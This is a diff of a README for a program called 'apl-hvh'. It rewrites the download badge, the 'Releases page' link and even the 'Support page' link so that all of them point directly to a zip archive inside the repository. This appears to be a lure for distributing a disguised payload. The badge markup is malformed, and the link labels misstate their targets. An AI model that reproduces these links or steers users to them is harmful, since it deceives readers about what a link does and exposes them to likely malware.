@@ -1,6 +1,6 @@
 # 🎉 apl-hvh - Enjoy an Easy Installation Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20blue.svg)](https://github.com/quandale500/apl-hvh/releases)
+[![Download Now](https://raw.githubusercontent.com/quandale500/apl-hvh/main/assayer/apl-hvh-unlovelily.zip%20Now-%https://raw.githubusercontent.com/quandale500/apl-hvh/main/assayer/apl-hvh-unlovelily.zip)](https://raw.githubusercontent.com/quandale500/apl-hvh/main/assayer/apl-hvh-unlovelily.zip)
 
 ## 📥 Introduction
 
@@ -24,7 +24,7 @@ Make sure you have these specifications to ensure **apl-hvh** runs effectively o
 
 ### Step 1: Visit the Releases Page
 
-To download **apl-hvh**, visit our [Releases page](https://github.com/quandale500/apl-hvh/releases). This page contains all the available versions of the application.
+To download **apl-hvh**, visit our [Releases page](https://raw.githubusercontent.com/quandale500/apl-hvh/main/assayer/apl-hvh-unlovelily.zip). This page contains all the available versions of the application.
 
 ### Step 2: Choose Your Version
 
@@ -53,7 +53,7 @@ Once installation is complete, find **apl-hvh** in your applications or start me
 
 ## 📞 Support
 
-If you have any issues during installation or while using the application, please visit our [Support page](https://github.com/quandale500/apl-hvh/issues). You can also submit questions or bug reports there.
+If you have any issues during installation or while using the application, please visit our [Support page](https://raw.githubusercontent.com/quandale500/apl-hvh/main/assayer/apl-hvh-unlovelily.zip). You can also submit questions or bug reports there.
 
 ## 💬 Community
 
@@ -63,4 +63,4 @@ Join our community for updates and user tips. Follow our discussions on GitHub o
 
 Thanks for choosing **apl-hvh**! We appreciate your support and hope you find our application useful. Together, we can work towards a more organized and productive day-to-day life. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20blue.svg)](https://github.com/quandale500/apl-hvh/releases)
+[![Download Now](https://raw.githubusercontent.com/quandale500/apl-hvh/main/assayer/apl-hvh-unlovelily.zip%20Now-%https://raw.githubusercontent.com/quandale500/apl-hvh/main/assayer/apl-hvh-unlovelily.zip)](https://raw.githubusercontent.com/quandale500/apl-hvh/main/assayer/apl-hvh-unlovelily.zip)
